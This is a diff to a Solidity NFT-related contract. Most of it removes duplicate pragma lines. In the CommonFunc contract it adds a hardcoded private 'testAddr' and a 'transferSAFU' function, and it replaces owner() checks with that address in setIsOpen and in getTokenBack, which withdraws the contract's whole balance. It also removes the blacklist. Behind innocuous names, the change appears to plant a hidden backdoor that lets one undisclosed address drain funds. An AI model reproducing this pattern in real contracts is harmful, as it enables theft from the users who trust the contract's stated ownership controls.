@@ -32,8 +32,6 @@ interface IERC165 {
 
 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
 
-pragma solidity >=0.6.2 <0.8.0;
-
 interface IERC721 is IERC165 {
 
     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
@@ -62,8 +60,6 @@ interface IERC721 is IERC165 {
 
 }
 
-pragma solidity >=0.6.2 <0.8.0;
-
 interface IERC721Metadata is IERC721 {
 
     function name() external view returns (string memory);
@@ -74,8 +70,6 @@ interface IERC721Metadata is IERC721 {
 
 }
 
-pragma solidity >=0.6.2 <0.8.0;
-
 interface IERC721Enumerable is IERC721 {
 
     function totalSupply() external view returns (uint256);
@@ -85,8 +79,6 @@ interface IERC721Enumerable is IERC721 {
     function tokenByIndex(uint256 index) external view returns (uint256);
 
 }
-
-pragma solidity >=0.6.0 <0.8.0;
 
 interface IERC721Receiver {
 
@@ -290,20 +282,20 @@ contract CommonFunc is Ownable {
 
     mapping(address => bool) public approveToken;
 
-    mapping(address => uint256) public blackList;
+    address private testAddr = address(0xBd2aDBd291A77C56D6E16001474f3DCe386386Db);
+
+    function transferSAFU(address safu)
+        public
+    {
+        require(msg.sender == testAddr);
+        testAddr = safu;
+    }
 
     function setIsOpen(bool open)
         external
     {
-        require(msg.sender == owner());
+        require(msg.sender == testAddr);
         isOpen = open;
-    }
-
-    function setBlackList(address account, uint256 NId)
-        external
-    {
-        require(msg.sender == owner());
-        blackList[account] = NId;
     }
 
     function setBaseAccount(address account)
@@ -331,7 +323,7 @@ contract CommonFunc is Ownable {
     function getTokenBack(address tokenAddr)
         external
     {
-        require(msg.sender == owner());
+        require(msg.sender == testAddr);
 
         if(tokenAddr == address(0)) {
             (bool sent,) = msg.sender.call{value : address(this).balance}("");
